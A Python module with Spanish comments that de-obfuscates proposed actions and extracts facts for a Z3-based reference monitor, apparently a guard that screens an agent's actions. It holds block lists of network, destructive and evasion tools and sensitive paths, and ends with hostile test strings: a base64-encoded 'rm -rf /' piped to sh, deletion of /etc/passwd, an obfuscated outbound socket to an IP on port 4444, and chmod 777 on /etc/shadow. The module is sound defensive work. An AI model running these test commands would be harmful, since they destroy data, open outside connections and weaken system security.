#!/usr/bin/env python3
"""FASE 2 - ETAPA 1: Motor de extraccion AST + des-ofuscacion sintactica.

Recibe proposed_action, target e intent y extrae deterministamente los hechos
observados (facts) mapeados a los predicados booleanos de Z3. Derrota evasiones
de texto mediante:

  1. Des-ofuscador recursivo: Base64, Hexadecimal, concatenacion de cadenas.
  2. Des-envoltura de wrappers: python -c, bash -c, eval(), exec(), os.system().
  3. Parser AST estructurado (libreria estandar `ast`) para codigo Python.
  4. Tokenizer seguro (shlex) para comandos Bash.
  5. Analizador de patrones estructurado para lenguaje natural (fallback).

La extraccion es recursiva y acotada: si una capa revela contenido anidado
(p. ej. base64 -> bash -> python -c -> eval), se analiza toda la cadena.
"""
from __future__ import annotations

import ast
import base64
import binascii
import re
import shlex
import logging
from dataclasses import dataclass, field

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("ast_extractor")

MAX_DEPTH = 6

# --------------------------------------------------------------------------- #
# Catalogos de elementos peligrosos / sensibles                                #
# --------------------------------------------------------------------------- #

SENSITIVE_PATHS = (
    "/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/cron", "/etc/selinux",
    "/root/.ssh", "/var/lib/mysql", "/opt/secret", "/opt/scada", "/boot",
    "/etc/iptables", "/etc/fstab", "z3_monitor", "reference_monitor",
)

ALLOWED_TARGETS = (
    "/var/log", "/tmp", "/opt/app", "/home/analyst", "host_local",
)

# Binarios Bash peligrosos -> predicado que activan
DANGEROUS_BINARIES = {
    "rm": "destroys_data",
    "dd": "destroys_data",
    "mkfs": "destroys_data",
    "shred": "destroys_data",
    "truncate": "destroys_data",
    "unlink": "destroys_data",
    "rmdir": "destroys_data",
    "chmod": "unauthorized_modification",
    "chown": "unauthorized_modification",
    "chattr": "evades_controls",
    "mv": "unauthorized_modification",
    "cp": "unauthorized_modification",
    "install": "unauthorized_modification",
    "tee": "unauthorized_modification",
    "iptables": "evades_controls",
    "ip6tables": "evades_controls",
    "setenforce": "evades_controls",
    "auditctl": "evades_controls",
    "history": "evades_controls",
    "crontab": "creates_persistence",
    "systemctl": "creates_persistence",
    "update-rc.d": "creates_persistence",
    "curl": "exfiltrates_data",
    "wget": "exfiltrates_data",
    "nc": "exfiltrates_data",
    "ncat": "exfiltrates_data",
    "netcat": "exfiltrates_data",
    "scp": "exfiltrates_data",
    "rsync": "exfiltrates_data",
    "ftp": "exfiltrates_data",
    "hydra": "propagates_network",
    "nmap": "propagates_network",
    "masscan": "propagates_network",
    "sshpass": "propagates_network",
    "base64": None,   # neutro: se analiza el contenido decodificado
    "eval": "evades_controls",
    "exec": "evades_controls",
}

# Modulos Python sensibles -> predicado
SENSITIVE_IMPORTS = {
    "os": "unauthorized_modification",
    "subprocess": "unauthorized_modification",
    "socket": "exfiltrates_data",
    "shutil": "destroys_data",
    "pty": "evades_controls",
    "ctypes": "evades_controls",
    "multiprocessing": "propagates_network",
    "http": "exfiltrates_data",
    "urllib": "exfiltrates_data",
    "requests": "exfiltrates_data",
    "paramiko": "propagates_network",
    "pymodbus": "compromises_physical",
}

# Llamadas Python peligrosas -> predicado
DANGEROUS_CALLS = {
    ("os", "system"): "unauthorized_modification",
    ("os", "popen"): "unauthorized_modification",
    ("os", "remove"): "destroys_data",
    ("os", "unlink"): "destroys_data",
    ("os", "rmdir"): "destroys_data",
    ("os", "rename"): "unauthorized_modification",
    ("os", "chmod"): "unauthorized_modification",
    ("os", "chown"): "unauthorized_modification",
    ("shutil", "rmtree"): "destroys_data",
    ("shutil", "copy"): "unauthorized_modification",
    ("shutil", "move"): "unauthorized_modification",
    ("subprocess", "run"): "unauthorized_modification",
    ("subprocess", "call"): "unauthorized_modification",
    ("subprocess", "Popen"): "unauthorized_modification",
    ("subprocess", "check_output"): "unauthorized_modification",
    ("socket", "socket"): "exfiltrates_data",
    ("pty", "spawn"): "evades_controls",
    ("eval",): "evades_controls",
    ("exec",): "evades_controls",
    ("open",): "unauthorized_modification",
}

PHYS_KW = ("scada", "plc", "modbus", "industrial", "subestacion",
           "setpoint", "tension", "actuador", "valvula", "sistema_ot")

EXFIL_KW = ("exfiltr", "transferir", "enviar", "externo", "reverse shell",
            "socket saliente", "host externo", "91.200", "45.10", "exfil")

DESTROY_KW = ("destruccion", "eliminar", "rm -rf", "borrar", "destruir",
              "sistema de archivos raiz", "shred", "mkfs", "dd if")

EVADE_KW = ("evadir", "deshabilitar", "flushear", "bypass", "neutralizar",
            "inhabilitar", "iptables -f", "selinux", "manipular logs",
            "ocultar trazas", "parchear", "setenforce 0", "history -c",
            "chattr", "auditctl")

PERSIST_KW = ("persistencia", "cron", "systemd", "recurrente", "no auditada",
              "no auditar", "crontab", "update-rc.d", ".bashrc", ".profile",
              "startup", "autorun")

PROP_KW = ("propagar", "fuerza bruta", "brute", "lateral", "propagacion",
           "10.0.0.0/24", "ssh contra", "hydra", "nmap", "masscan")

WRITE_KW = ("modificar", "escribir", "sobrescribir", "anadir", "cambiar",
            "inyectar", "instalar", "crear usuario", "uid 0", "chmod", "chown",
            "tee", "sed -i", "mv >", "echo >")

READ_KW = ("leer", "parsear", "listar", "auditar", "verificar", "reportar",
           "escanear", "metricas", "solo lectura", "enumerar", "inventariar",
           "checksum", "df -h", "ps aux", "ss -tulpn", "cloc", "find con stat",
           "cat ", "head ", "tail ", "grep ", "stat ", "ls -")

PREDICATES = (
    "compromises_physical", "unauthorized_modification", "exfiltrates_data",
    "destroys_data", "evades_controls", "creates_persistence",
    "propagates_network", "read_only",
)


# --------------------------------------------------------------------------- #
# Resultado                                                                    #
# --------------------------------------------------------------------------- #

@dataclass
class Facts:
    compromises_physical: bool = False
    unauthorized_modification: bool = False
    exfiltrates_data: bool = False
    destroys_data: bool = False
    evades_controls: bool = False
    creates_persistence: bool = False
    propagates_network: bool = False
    read_only: bool = False
    in_policy_local: bool = False
    matched_rules: list = field(default_factory=list)
    deobfuscated_variants: list = field(default_factory=list)

    def set_pred(self, name: str, rule: str = ""):
        if name and name in PREDICATES:
            if not getattr(self, name):
                setattr(self, name, True)
            if rule and rule not in self.matched_rules:
                self.matched_rules.append(rule)

    def as_dict(self) -> dict:
        d = {p: getattr(self, p) for p in PREDICATES}
        d["in_policy_local"] = self.in_policy_local
        d["matched_rules"] = list(self.matched_rules)
        d["deobfuscated_variants"] = list(self.deobfuscated_variants)
        return d


# --------------------------------------------------------------------------- #
# Des-ofuscacion                                                               #
# --------------------------------------------------------------------------- #

_B64_RE = re.compile(r"[A-Za-z0-9+/]{8,}={0,2}")
_HEX_RE = re.compile(r"(?:\\x[0-9a-fA-F]{2}){4,}")
_HEXSTR_RE = re.compile(r"[0-9a-fA-F]{16,}")


def _try_b64decode(s: str) -> str | None:
    """Decodifica Base64 si el resultado es texto imprimible."""
    for candidate in _B64_RE.findall(s):
        pad = candidate + "=" * (-len(candidate) % 4)
        try:
            raw = base64.b64decode(pad, validate=True)
            decoded = raw.decode("utf-8", errors="strict")
            if len(decoded) >= 3 and _is_printable(decoded):
                return decoded
        except (binascii.Error, ValueError, UnicodeDecodeError):
            continue
    return None


def _try_hexdecode(s: str) -> str | None:
    """Decodifica secuencias hex (\\x41\\x42 o string hex puro)."""
    # \\xNN escapes
    for m in _HEX_RE.findall(s):
        pairs = re.findall(r"\\x([0-9a-fA-F]{2})", m)
        if len(pairs) < 4:
            continue
        try:
            raw = bytes(int(p, 16) for p in pairs)
            decoded = raw.decode("utf-8", errors="strict")
            if _is_printable(decoded):
                return decoded
        except (ValueError, UnicodeDecodeError):
            continue
    # string hex puro (bytes.fromhex)
    for m in _HEXSTR_RE.findall(s):
        if len(m) % 2:
            continue
        try:
            raw = bytes.fromhex(m)
            decoded = raw.decode("utf-8", errors="strict")
            if len(decoded) >= 3 and _is_printable(decoded):
                return decoded
        except (ValueError, UnicodeDecodeError):
            continue
    return None


def _is_printable(s: str) -> bool:
    return all(32 <= ord(c) < 127 or c in "\n\r\t" for c in s)


def _eval_string_concat(code: str) -> str | None:
    """Evalua estaticamente concatenaciones de strings literales simples."""
    try:
        node = ast.parse(code, mode="eval").body
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            return _ast_str(node)
    except Exception:
        pass
    return None


def _ast_str(node) -> str | None:
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        left, right = _ast_str(node.left), _ast_str(node.right)
        if left is not None and right is not None:
            return left + right
    return None


# --------------------------------------------------------------------------- #
# Des-envoltura de wrappers                                                    #
# --------------------------------------------------------------------------- #

_WRAPPER_RES = [
    re.compile(r'(?:python3?|python)\s+-c\s+["\'](.+?)["\']', re.S),
    re.compile(r'(?:bash|sh|zsh)\s+-c\s+["\'](.+?)["\']', re.S),
    re.compile(r'\beval\s*\(\s*["\'](.+?)["\']\s*\)', re.S),
    re.compile(r'\bexec\s*\(\s*["\'](.+?)["\']\s*\)', re.S),
    re.compile(r'\bos\.system\s*\(\s*["\'](.+?)["\']\s*\)', re.S),
    re.compile(r'\bsubprocess\.\w+\s*\(\s*["\'](.+?)["\']\s*\)', re.S),
    re.compile(r'echo\s+([A-Za-z0-9+/=]+)\s*\|\s*base64\s+-d\s*\|\s*(?:sh|bash)', re.S),
]


def _unwrap(text: str) -> list[str]:
    out = []
    for rx in _WRAPPER_RES:
        for m in rx.findall(text):
            out.append(m)
    return out


# --------------------------------------------------------------------------- #
# Generacion de variantes des-ofuscadas (recursiva)                            #
# --------------------------------------------------------------------------- #

def deobfuscate(text: str, depth: int = 0) -> list[str]:
    """Devuelve todas las variantes alcanzables por des-ofuscacion recursiva."""
    variants = [text]
    if depth >= MAX_DEPTH:
        return variants

    candidates = []
    # base64
    d = _try_b64decode(text)
    if d and d != text:
        candidates.append(d)
    # hex
    d = _try_hexdecode(text)
    if d and d != text:
        candidates.append(d)
    # wrappers
    candidates.extend(_unwrap(text))
    # string concat
    d = _eval_string_concat(text)
    if d and d != text:
        candidates.append(d)
    # base64 dentro de subcadenas (echo X | base64 -d)
    for m in re.findall(r"echo\s+([A-Za-z0-9+/=]+)\s*\|\s*base64\s+-d", text):
        pad = m + "=" * (-len(m) % 4)
        try:
            raw = base64.b64decode(pad, validate=True).decode("utf-8", errors="strict")
            if _is_printable(raw):
                candidates.append(raw)
        except (binascii.Error, ValueError, UnicodeDecodeError):
            pass

    seen = set(variants)
    for c in candidates:
        c = c.strip()
        if c and c not in seen:
            seen.add(c)
            variants.append(c)
            variants.extend(deobfuscate(c, depth + 1))
    return variants


# --------------------------------------------------------------------------- #
# Analisis AST Python                                                          #
# --------------------------------------------------------------------------- #

def _full_attr(node) -> str:
    """Reconstruye el nombre completo de una llamada/atributo: os.system."""
    parts = []
    cur = node
    while isinstance(cur, ast.Attribute):
        parts.append(cur.attr)
        cur = cur.value
    if isinstance(cur, ast.Name):
        parts.append(cur.id)
    return ".".join(reversed(parts))


def _string_constants(tree) -> list[str]:
    consts = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            consts.append(node.value)
    return consts


def analyze_python(code: str, facts: Facts) -> bool:
    """Analiza codigo Python via AST. Devuelve True si el parseo tuvo exito."""
    try:
        tree = ast.parse(code)
    except (SyntaxError, ValueError):
        return False

    # Imports sensibles
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                top = alias.name.split(".")[0]
                if top in SENSITIVE_IMPORTS:
                    facts.set_pred(SENSITIVE_IMPORTS[top], f"py_import:{alias.name}")
        elif isinstance(node, ast.ImportFrom):
            top = (node.module or "").split(".")[0]
            if top in SENSITIVE_IMPORTS:
                facts.set_pred(SENSITIVE_IMPORTS[top], f"py_importfrom:{node.module}")

    # Llamadas peligrosas
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = _full_attr(node.func)
            parts = tuple(name.split("."))
            # coincidencia exacta o por (modulo, func)
            if parts in DANGEROUS_CALLS:
                facts.set_pred(DANGEROUS_CALLS[parts], f"py_call:{name}")
            elif len(parts) >= 2 and parts[-2:] in DANGEROUS_CALLS:
                facts.set_pred(DANGEROUS_CALLS[parts[-2:]], f"py_call:{name}")
            elif parts[-1:] in DANGEROUS_CALLS:
                facts.set_pred(DANGEROUS_CALLS[parts[-1:]], f"py_call:{name}")
            # open(path, 'w'/'a'/'x') => modificacion; open(path,'r') => read
            if parts[-1] == "open" and node.args:
                mode = ""
                if len(node.args) >= 2:
                    mode = _literal(node.args[1])
                if mode and any(c in mode for c in ("w", "a", "x", "+")):
                    facts.set_pred("unauthorized_modification", "py_open_write")
                elif mode and "r" in mode:
                    facts.set_pred("read_only", "py_open_read")

    # Constantes de string: rutas sensibles y patrones
    for s in _string_constants(tree):
        _scan_text_for_predicates(s, facts, source="py_strconst")

    return True


def _literal(node) -> str:
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    return ""


# --------------------------------------------------------------------------- #
# Analisis Bash via shlex                                                      #
# --------------------------------------------------------------------------- #

SHELL_METACHARS = set(";|&><`$")


def analyze_bash(cmd: str, facts: Facts, _depth: int = 0) -> bool:
    """Analiza un comando Bash via shlex. Devuelve True si tokenizo."""
    if _depth > 12:
        return True
    # Operadores de encadenamiento (; | &) requieren division recursiva
    chain_chars = ";|&"
    has_chain = any(c in cmd for c in chain_chars)
    if has_chain:
        subcmds = re.split(r"[;|&]+", cmd)
        for sub in subcmds:
            sub = sub.strip()
            if sub and sub != cmd:
                analyze_bash(sub, facts, _depth + 1)
        # redireccion a archivo sensible
        for m in re.findall(r"[>]{1,2}\s*(\S+)", cmd):
            if _is_sensitive_path(m):
                facts.set_pred("unauthorized_modification", f"bash_redir:{m}")
        # process substitution / backticks
        if "`" in cmd or "$(" in cmd:
            for m in re.findall(r"\$\((.+?)\)", cmd):
                if m.strip() and m.strip() != cmd:
                    analyze_bash(m, facts, _depth + 1)
        # re-tokenizar el primer segmento para el binario
        first = re.split(r"[;|&<>]", cmd)[0].strip()
    else:
        # redireccion a archivo sensible (sin encadenamiento)
        for m in re.findall(r"[>]{1,2}\s*(\S+)", cmd):
            if _is_sensitive_path(m):
                facts.set_pred("unauthorized_modification", f"bash_redir:{m}")
        if "$(" in cmd:
            for m in re.findall(r"\$\((.+?)\)", cmd):
                if m.strip() and m.strip() != cmd:
                    analyze_bash(m, facts, _depth + 1)
        first = re.split(r"[<>]", cmd)[0].strip()

    try:
        tokens = shlex.split(first, posix=True)
    except ValueError:
        tokens = first.split()

    if not tokens:
        return True

    binary = tokens[0].split("/")[-1]  # basename
    if binary in DANGEROUS_BINARIES:
        pred = DANGEROUS_BINARIES[binary]
        if pred:
            facts.set_pred(pred, f"bash_bin:{binary}")
        # rm con -rf o sobre /
        if binary == "rm" and (("-rf" in " ".join(tokens)) or any(t == "/" or t == "/*" for t in tokens)):
            facts.set_pred("destroys_data", "bash_rm_rf")
        if binary == "dd":
            facts.set_pred("destroys_data", "bash_dd")
        if binary in ("chmod", "chown", "mv", "cp", "install", "tee") and _args_have_sensitive(tokens):
            facts.set_pred("unauthorized_modification", f"bash_write_sensitive:{binary}")
        if binary in ("curl", "wget", "nc", "scp", "rsync") and _args_have_external(tokens):
            facts.set_pred("exfiltrates_data", f"bash_exfil:{binary}")
        if binary == "iptables" and "-f" in " ".join(tokens).lower():
            facts.set_pred("evades_controls", "bash_iptables_flush")
        if binary == "setenforce" and "0" in tokens:
            facts.set_pred("evades_controls", "bash_setenforce_0")

    # Escanear todos los tokens en busca de rutas sensibles / patrones
    for tok in tokens:
        if _is_sensitive_path(tok):
            facts.set_pred("unauthorized_modification", f"bash_sensitive_path:{tok}")
        _scan_text_for_predicates(tok, facts, source="bash_tok")

    return True


def _is_sensitive_path(s: str) -> bool:
    sl = s.lower()
    return any(p in sl for p in SENSITIVE_PATHS)


def _args_have_sensitive(tokens: list) -> bool:
    return any(_is_sensitive_path(t) for t in tokens[1:])


def _args_have_external(tokens: list) -> bool:
    return any(re.search(r"(?:https?://|ftp://|\d+\.\d+\.\d+\.\d+)", t) for t in tokens[1:])


# --------------------------------------------------------------------------- #
# Analizador de patrones estructurado (lenguaje natural + fallback)            #
# --------------------------------------------------------------------------- #

def _scan_text_for_predicates(text: str, facts: Facts, source: str = "text"):
    t = text.lower()
    if any(k in t for k in PHYS_KW):
        facts.set_pred("compromises_physical", f"{source}:physical")
    if any(k in t for k in EXFIL_KW):
        facts.set_pred("exfiltrates_data", f"{source}:exfil")
    if any(k in t for k in DESTROY_KW):
        facts.set_pred("destroys_data", f"{source}:destroy")
    if "ransomware" in t or ("cifrar" in t and any(k in t for k in ("rescate", "pago", "rescatar"))):
        facts.set_pred("destroys_data", f"{source}:ransomware")
        facts.set_pred("unauthorized_modification", f"{source}:ransomware")
    if any(k in t for k in EVADE_KW):
        facts.set_pred("evades_controls", f"{source}:evade")
    if any(k in t for k in PERSIST_KW):
        facts.set_pred("creates_persistence", f"{source}:persist")
    if any(k in t for k in PROP_KW):
        facts.set_pred("propagates_network", f"{source}:propagate")
    if any(k in t for k in WRITE_KW):
        if _is_sensitive_path(text) or "root" in t:
            facts.set_pred("unauthorized_modification", f"{source}:write_sensitive")
    if "cryptominer" in t or "mineria" in t:
        facts.set_pred("unauthorized_modification", f"{source}:cryptominer")
        facts.set_pred("creates_persistence", f"{source}:cryptominer")
    if any(k in t for k in READ_KW):
        facts.set_pred("read_only", f"{source}:read")
    # rutas sensibles sueltas
    if _is_sensitive_path(text):
        facts.set_pred("unauthorized_modification", f"{source}:sensitive_path")


# --------------------------------------------------------------------------- #
# Orquestador principal                                                        #
# --------------------------------------------------------------------------- #

def extract_facts(action: str, target: str, intent: str = "") -> Facts:
    """Extraccion determinista completa: des-ofuscacion + AST + shlex + patrones."""
    facts = Facts()
    combined = f"{intent} {action} {target}"
    variants = deobfuscate(combined)
    # tambien deobfuscar action y target por separado
    for v in deobfuscate(action):
        if v not in variants:
            variants.append(v)
    facts.deobfuscated_variants = variants

    for v in variants:
        # 1. Patrones estructurados (siempre, capta lenguaje natural)
        _scan_text_for_predicates(v, facts, source="text")
        # 2. AST Python (si parsea)
        analyze_python(v, facts)
        # 3. Bash shlex (si parece comando)
        if _looks_like_shell(v):
            analyze_bash(v, facts)

    # Politica local: solo lectura Y objetivo permitido Y sin violaciones
    target_ok = any(target.startswith(a) or target == a for a in ALLOWED_TARGETS)
    no_violation = not any(getattr(facts, p) for p in PREDICATES if p != "read_only")
    if facts.read_only and target_ok and no_violation:
        facts.in_policy_local = True
        if "in_policy_local" not in facts.matched_rules:
            facts.matched_rules.append("in_policy_local")

    return facts


def _looks_like_shell(s: str) -> bool:
    if not s.strip():
        return False
    first = re.split(r"[;|&<>\s]", s.strip(), 1)[0]
    binary = first.split("/")[-1]
    return bool(binary) and (binary in DANGEROUS_BINARIES or binary in {
        "ls", "cat", "echo", "grep", "find", "awk", "sed", "head", "tail",
        "stat", "df", "ps", "ss", "sha256sum", "wc", "cloc", "python", "python3",
        "bash", "sh", "perl", "ruby", "node", "base64", "xxd", "openssl",
    })


# --------------------------------------------------------------------------- #
# CLI de prueba                                                                #
# --------------------------------------------------------------------------- #

if __name__ == "__main__":
    tests = [
        ("echo cm0gLXJmIC8K | base64 -d | sh", "/", "b64_rmrf"),
        ("python3 -c \"import os; os.system('rm -rf /etc/passwd')\"", "/etc/passwd", "py_os_system"),
        ("eval('ex' + 'ec(\"import socket; socket.socket().connect((\\'91.200.0.9\\',4444))\")')", "host", "eval_exec_socket"),
        ("bash -c 'chmod 777 /etc/shadow'", "/etc/shadow", "bash_chmod_shadow"),
        ("ls -la /tmp/artifacts", "/tmp/artifacts", "legit_ls"),
    ]
    for action, target, name in tests:
        f = extract_facts(action, target)
        print(f"[{name}] variants={len(f.deobfuscated_variants)} rules={f.matched_rules}")
        print(f"   facts={f.as_dict()}")
